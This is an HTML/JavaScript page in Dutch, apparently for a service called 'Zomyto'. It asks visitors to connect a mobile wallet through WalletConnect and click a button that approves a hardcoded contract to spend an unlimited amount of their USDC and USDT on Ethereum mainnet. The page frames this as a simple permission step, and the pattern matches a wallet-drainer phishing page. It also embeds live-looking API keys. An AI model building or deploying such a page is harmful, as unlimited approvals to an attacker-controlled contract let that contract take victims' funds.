<!DOCTYPE html>
<html lang="nl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Zomyto – Approve Stablecoins</title>

  <!-- Ethers v5 -->
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>

  <!-- Web3Modal v3 (WalletConnect v2) - UMD CDN -->
  <script src="https://unpkg.com/@web3modal/wagmi@3.5.5/dist/index.umd.js"></script>

  <style>
    body {
      background: #121212;
      color: white;
      font-family: Arial, sans-serif;
      text-align: center;
      padding-top: 50px;
    }
    button {
      background: #1e88e5;
      color: white;
      padding: 12px 20px;
      border: none;
      border-radius: 8px;
      font-size: 1rem;
      cursor: pointer;
      margin: 10px;
    }
    button:disabled {
      background: grey;
      cursor: not-allowed;
    }
    #status {
      margin-top: 20px;
      font-size: 0.9rem;
      color: #ccc;
    }
  </style>
</head>
<body>
  <h1>Zomyto – Approve Stablecoins</h1>
  <p>
    1. Verbind je mobiele wallet (bijv. Exodus) via WalletConnect.<br />
    2. Klik op <b>Approve USDC &amp; USDT</b> om toestemming te geven aan het Zomyto-contract.
  </p>

  <!-- CONNECT BUTTON (Wordt door Web3Modal gerenderd) -->
  <w3m-button></w3m-button>

  <div style="margin-top: 30px">
    <button id="approveBtn" disabled>✅ Approve USDC &amp; USDT</button>
  </div>

  <div id="status">Status: Niet verbonden</div>

  <script>
    // ======= CONFIG =======
    const projectId = "0e7d96df89f873ddfb0b4381e13c883c"; // jouw WalletConnect v2 projectId

    // Ethereum mainnet
    const CHAIN_ID = 1;
    const RPC_URL =
      "https://mainnet.infura.io/v3/1506833c04954b058aad864f0d9ce1a2";

    // ERC20 tokens op mainnet
    const TOKENS = [
      { name: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" },
      { name: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7" }
    ];

    // JOUW contract dat toestemming krijgt
    const SPENDER = "0x2F6DAC950c8e2433734Fe50bC72F18E2d2dD8f2A";

    const tokenABI = [
      "function approve(address spender, uint256 amount) public returns (bool)"
    ];

    const statusEl = document.getElementById("status");
    const approveBtn = document.getElementById("approveBtn");

    function setStatus(msg) {
      console.log(msg);
      statusEl.textContent = "Status: " + msg;
    }

    let ethersProvider = null;
    let signer = null;

    (async function init() {
      console.log("window.w3m wagmi UMD =", window.W3mWagmi);
      if (!window.W3mWagmi) {
        setStatus("Web3Modal kon niet geladen worden (CDN probleem).");
        return;
      }

      const {
        createWeb3Modal,
        defaultWagmiConfig,
        WagmiCore,
        reconnect
      } = window.W3mWagmi;

      const { mainnet } = WagmiCore.chains;

      // Wagmi / Web3Modal config
      const metadata = {
        name: "Zomyto",
        description: "Zomyto Stablecoin Approvals",
        url: "https://zomyto.github.io/zomyto-qr/",
        icons: ["https://zomyto.github.io/zomyto-qr/icon.png"] // mag niet bestaan, is ok
      };

      const chains = [mainnet];

      const wagmiConfig = defaultWagmiConfig({
        chains,
        projectId,
        metadata
      });

      // Init Web3Modal
      const modal = createWeb3Modal({
        wagmiConfig,
        projectId,
        chains,
        themeMode: "dark"
      });

      console.log("Web3Modal initialized:", modal);

      // Automatisch proberen te reconnecten
      reconnect(wagmiConfig);

      // Gebruik Wagmi provider als basis voor ethers.js
      const { getAccount, getProvider, watchAccount } = WagmiCore;

      async function setupEthers() {
        const account = getAccount(wagmiConfig);
        console.log("Wagmi getAccount:", account);

        if (!account || !account.address || !account.isConnected) {
          setStatus("Niet verbonden");
          approveBtn.disabled = true;
          signer = null;
          ethersProvider = null;
          return;
        }

        const wagmiProvider = getProvider(wagmiConfig);
        console.log("wagmiProvider:", wagmiProvider);

        if (!wagmiProvider) {
          setStatus("Geen provider gevonden, verbind eerst de wallet.");
          approveBtn.disabled = true;
          return;
        }

        // Wagmi provider → Ethers provider
        ethersProvider = new ethers.providers.Web3Provider(wagmiProvider);
        signer = ethersProvider.getSigner();

        const address = await signer.getAddress();
        const network = await ethersProvider.getNetwork();
        setStatus(`Verbonden met ${address} op chainId ${network.chainId}`);

        if (Number(network.chainId) !== CHAIN_ID) {
          alert(
            "Let op: je zit niet op Ethereum mainnet. Schakel over in je wallet."
          );
        }

        approveBtn.disabled = false;
      }

      // Reageer op account changes
      watchAccount(wagmiConfig, {
        onChange() {
          console.log("Account change gedetecteerd");
          setupEthers();
        }
      });

      // Eerste keer opstarten
      setupEthers();

      // ===== APPROVE KNOP =====
      approveBtn.onclick = async () => {
        if (!signer) {
          alert("Geen signer gevonden. Verbind eerst je wallet.");
          return;
        }

        try {
          for (const t of TOKENS) {
            setStatus(`Verstuur approve transactie voor ${t.name}...`);
            const token = new ethers.Contract(t.address, tokenABI, signer);

            // MaxUint256 = onbeperkte toestemming
            const tx = await token.approve(
              SPENDER,
              ethers.constants.MaxUint256
            );
            setStatus(`Wachten op bevestiging van ${t.name} transactie...`);
            await tx.wait();
            console.log(`✅ Approved ${t.name}`);
          }

          setStatus("USDC & USDT succesvol goedgekeurd!");
          alert("USDC & USDT succesvol goedgekeurd!");
        } catch (err) {
          console.error("Fout bij approve:", err);
          setStatus("Fout bij approve: " + err.message);
          alert("Fout bij approve: " + err.message);
        }
      };
    })();
  </script>
</body>
</html>
